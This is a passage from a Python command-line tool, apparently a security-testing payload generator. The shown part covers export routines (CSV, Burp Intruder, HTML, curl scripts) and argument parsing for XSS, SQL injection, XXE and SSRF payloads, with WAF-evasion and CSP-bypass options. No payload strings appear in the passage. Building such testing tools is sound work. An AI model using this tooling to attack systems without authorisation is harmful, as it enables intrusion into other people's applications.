        f.write(html_report)
    
    print(f"Exported detailed HTML report to {output_file}")

def export_csv_report(payloads, output_file):
    """Export payloads in CSV format for easy import into other tools"""
    with open(output_file, 'w') as f:
        # Write header
        f.write("payload_type,payload,encoding\n")
        
        # Write payloads
        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                # Properly escape the payload for CSV
                escaped_payload = payload.replace('"', '""')
                f.write(f'"{payload_type}","{escaped_payload}","standard"\n')
    
    print(f"Exported CSV report to {output_file}")

def export_burp_intruder_file(payloads, output_file):
    """Export payloads in a format suitable for Burp Suite Intruder"""
    with open(output_file, 'w') as f:
        for payload_type, payload_list in payloads.items():
            f.write(f"# {payload_type.upper()} Payloads\n")
            
            for payload in payload_list:
                f.write(f"{payload}\n")
            
            f.write("\n")
    
    print(f"Exported Burp Intruder payload file to {output_file}")

def main():
    # Set up command line argument parsing
    parser = argparse.ArgumentParser(description='Generate security testing payloads for various vulnerability types')
    
    parser.add_argument('--type', choices=['xss', 'sqli', 'xxe', 'ssrf', 'all'], default='all',
                      help='Type of payloads to generate')
    parser.add_argument('--count', type=int, default=5, 
                      help='Number of payloads to generate for each type')
    parser.add_argument('--complexity', choices=['low', 'medium', 'high'], default='medium',
                      help='Complexity level of generated payloads')
    parser.add_argument('--encoding', choices=['standard', 'url', 'double_url', 'hex', 'unicode', 'html_entities', 'base64'], 
                      default='standard', help='Encoding method for payloads')
    parser.add_argument('--waf-evasion', action='store_true', 
                      help='Apply WAF evasion techniques to payloads')
    parser.add_argument('--csp-bypass', action='store_true',
                      help='Generate XSS payloads with CSP bypass techniques')
    parser.add_argument('--output-dir', default='payloads',
                      help='Directory to save generated payloads')
    parser.add_argument('--format', choices=['txt', 'json', 'curl', 'html', 'csv', 'burp'], default='txt',
                      help='Output format for payloads')
    parser.add_argument('--target-url', default='http://example.com/test',
                      help='Target URL for curl commands (used with --format=curl)')
    parser.add_argument('--output-file', default='payloads_output',
                      help='Output file name (without extension)')
    parser.add_argument('--add-signature', action='store_true',
                      help='Add signature to identify payloads as test payloads')
    
    args = parser.parse_args()
    
    # Initialize payload generator
    generator = PayloadGenerator(
        complexity=args.complexity,
        encoding=args.encoding,
        waf_evasion=args.waf_evasion
    )
    
    # Generate payloads
    if args.type == 'all':
        payloads = generator.generate_all_payloads(num_each=args.count)
    elif args.type == 'xss':
        payloads = {"xss": generator.generate_xss_payloads(num=args.count, bypass_csp=args.csp_bypass)}
    elif args.type == 'sqli':
        payloads = {"sqli": generator.generate_sqli_payloads(num=args.count, randomize=True)}
    elif args.type == 'xxe':
        payloads = {"xxe": generator.generate_xxe_payloads(num=args.count)}
    elif args.type == 'ssrf':
        payloads = {"ssrf": generator.generate_ssrf_payloads(num=args.count)}
    
    # Add signature if requested
    if args.add_signature:
        add_signature(payloads)
    
    # Export payloads in the specified format
    if args.format == 'txt':
        save_payload_to_file(payloads, args.output_dir, args.output_file)
    elif args.format == 'json':
        export_as_json(payloads, f"{args.output_file}.json")
    elif args.format == 'curl':
        export_as_curl(payloads, args.target_url, f"{args.output_file}.sh")
    elif args.format == 'html':
        export_payload_report(payloads, f"{args.output_file}.html")
    elif args.format == 'csv':
        export_csv_report(payloads, f"{args.output_file}.csv")
    elif args.format == 'burp':
        export_burp_intruder_file(payloads, f"{args.output_file}.txt")

if __name__ == "__main__":
    main()
